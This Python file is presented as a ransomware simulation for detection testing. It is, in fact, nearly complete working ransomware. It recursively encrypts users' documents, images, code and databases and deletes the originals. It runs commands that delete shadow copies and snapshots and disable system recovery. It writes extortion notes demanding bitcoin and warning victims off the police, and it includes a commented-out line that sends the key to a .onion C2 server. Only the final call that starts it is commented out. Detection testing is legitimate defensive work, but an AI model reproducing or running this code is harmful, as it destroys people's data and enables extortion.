#!/usr/bin/env python3
"""
Ransomware Simulation - TEST ONLY
DO NOT EXECUTE - For YARA/ML detection testing
"""

import os
import sys
import json
import base64
import hashlib
import threading
from pathlib import Path
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Ransomware configuration
RANSOM_AMOUNT = "0.5 BTC"
BITCOIN_WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
CONTACT_EMAIL = "decrypt@darkweb.onion"
DEADLINE_HOURS = 72
ENCRYPTED_EXTENSION = ".LOCKED"

# Target file extensions
TARGET_EXTENSIONS = [
    # Documents
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf",
    # Images
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg", ".psd", ".ai",
    # Audio/Video
    ".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wav", ".flac",
    # Archives
    ".zip", ".rar", ".7z", ".tar", ".gz",
    # Code
    ".py", ".js", ".java", ".cpp", ".c", ".h", ".cs", ".php", ".rb", ".go",
    # Database
    ".sql", ".db", ".sqlite", ".mdb",
    # Other
    ".csv", ".json", ".xml", ".html", ".css",
]

# Directories to skip
SKIP_DIRS = [
    "Windows", "Program Files", "Program Files (x86)",
    "System Volume Information", "$Recycle.Bin",
    "/bin", "/sbin", "/usr", "/lib", "/boot", "/proc", "/sys"
]

RANSOM_NOTE = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗                           ║
║   ██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                          ║
║   ██║     ██║   ██║██║     █████╔╝ █████╗  ██║  ██║                          ║
║   ██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██║  ██║                          ║
║   ███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██████╔╝                          ║
║   ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

                    !!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your important files have been encrypted with military-grade AES-256 encryption.
This includes documents, photos, videos, databases, and other valuable data.

To recover your files, you must pay: {ransom_amount}

Bitcoin Wallet: {wallet}

After payment, contact us at: {email}
Include your unique ID: {victim_id}

DEADLINE: {deadline}

After the deadline, the price will DOUBLE.
After 7 days, your decryption key will be PERMANENTLY DELETED.

WARNING:
- Do NOT try to decrypt files yourself - they will be corrupted
- Do NOT rename encrypted files
- Do NOT use third-party decryption tools
- Do NOT contact law enforcement - we will know

Files encrypted: {file_count}
Encryption date: {date}

Your unique victim ID: {victim_id}
"""

class Ransomware:
    def __init__(self):
        self.victim_id = self._generate_victim_id()
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.encrypted_count = 0
        self.total_size = 0
        
    def _generate_victim_id(self):
        """Generate unique victim identifier"""
        data = f"{os.uname().nodename}{os.getenv('USER')}{datetime.now().isoformat()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16].upper()
    
    def _should_encrypt(self, filepath):
        """Check if file should be encrypted"""
        path = Path(filepath)
        
        # Skip system directories
        for skip_dir in SKIP_DIRS:
            if skip_dir in str(path):
                return False
        
        # Check extension
        if path.suffix.lower() not in TARGET_EXTENSIONS:
            return False
        
        # Skip already encrypted
        if path.suffix == ENCRYPTED_EXTENSION:
            return False
        
        # Skip small files
        if path.stat().st_size < 100:
            return False
            
        return True
    
    def _encrypt_file(self, filepath):
        """Encrypt a single file"""
        try:
            path = Path(filepath)
            
            # Read original content
            with open(path, 'rb') as f:
                data = f.read()
            
            # Encrypt
            encrypted = self.fernet.encrypt(data)
            
            # Write encrypted content
            encrypted_path = str(path) + ENCRYPTED_EXTENSION
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
            
            # Delete original
            os.remove(filepath)
            
            self.encrypted_count += 1
            self.total_size += len(data)
            
            return True
        except Exception as e:
            return False
    
    def _scan_and_encrypt(self, start_path):
        """Recursively scan and encrypt files"""
        for root, dirs, files in os.walk(start_path):
            # Skip system directories
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            
            for filename in files:
                filepath = os.path.join(root, filename)
                
                if self._should_encrypt(filepath):
                    self._encrypt_file(filepath)
    
    def _delete_shadow_copies(self):
        """Delete Windows shadow copies / Linux snapshots"""
        commands = [
            # Windows
            "vssadmin delete shadows /all /quiet",
            "wmic shadowcopy delete",
            # Linux
            "rm -rf /.snapshots/*",
            "btrfs subvolume delete /.snapshots/*",
        ]
        for cmd in commands:
            try:
                os.system(cmd + " 2>/dev/null")
            except:
                pass
    
    def _disable_recovery(self):
        """Disable system recovery options"""
        commands = [
            # Windows
            "bcdedit /set {default} recoveryenabled No",
            "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
            # Linux - disable apt/dnf
            "chmod 000 /usr/bin/apt",
            "chmod 000 /usr/bin/dnf",
        ]
        for cmd in commands:
            try:
                os.system(cmd + " 2>/dev/null")
            except:
                pass
    
    def _create_ransom_note(self, directory):
        """Create ransom note in directory"""
        deadline = datetime.now() + timedelta(hours=DEADLINE_HOURS)
        
        note = RANSOM_NOTE.format(
            ransom_amount=RANSOM_AMOUNT,
            wallet=BITCOIN_WALLET,
            email=CONTACT_EMAIL,
            victim_id=self.victim_id,
            deadline=deadline.strftime("%Y-%m-%d %H:%M:%S UTC"),
            file_count=self.encrypted_count,
            date=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        note_files = [
            "README_LOCKED.txt",
            "HOW_TO_DECRYPT.txt", 
            "RESTORE_FILES.txt",
            "!!! READ ME !!!.txt"
        ]
        
        for note_file in note_files:
            try:
                with open(os.path.join(directory, note_file), 'w') as f:
                    f.write(note)
            except:
                pass
    
    def _change_wallpaper(self):
        """Change desktop wallpaper to ransom message"""
        # Would create image with ransom message and set as wallpaper
        pass
    
    def _send_key_to_c2(self):
        """Send encryption key to C2 server"""
        payload = {
            "victim_id": self.victim_id,
            "key": base64.b64encode(self.key).decode(),
            "files_encrypted": self.encrypted_count,
            "total_size": self.total_size,
            "timestamp": datetime.now().isoformat()
        }
        # Would POST to C2 server
        # requests.post("https://c2.darkweb.onion/keys", json=payload)
    
    def run(self, target_dirs=None):
        """Execute ransomware attack"""
        if target_dirs is None:
            target_dirs = [
                str(Path.home()),
                "/home",
                "C:\\Users"
            ]
        
        print("[*] Deleting shadow copies...")
        self._delete_shadow_copies()
        
        print("[*] Disabling recovery...")
        self._disable_recovery()
        
        print("[*] Encrypting files...")
        for target in target_dirs:
            if os.path.exists(target):
                self._scan_and_encrypt(target)
        
        print(f"[*] Encrypted {self.encrypted_count} files")
        
        print("[*] Creating ransom notes...")
        for target in target_dirs:
            if os.path.exists(target):
                self._create_ransom_note(target)
        
        print("[*] Sending key to C2...")
        self._send_key_to_c2()
        
        print("[*] Changing wallpaper...")
        self._change_wallpaper()
        
        print(f"[+] Attack complete! Victim ID: {self.victim_id}")

if __name__ == "__main__":
    print("=" * 60)
    print("  RANSOMWARE SIMULATION - TEST FILE ONLY")
    print("  DO NOT EXECUTE - For security testing purposes")
    print("=" * 60)
    # ransomware = Ransomware()
    # ransomware.run()
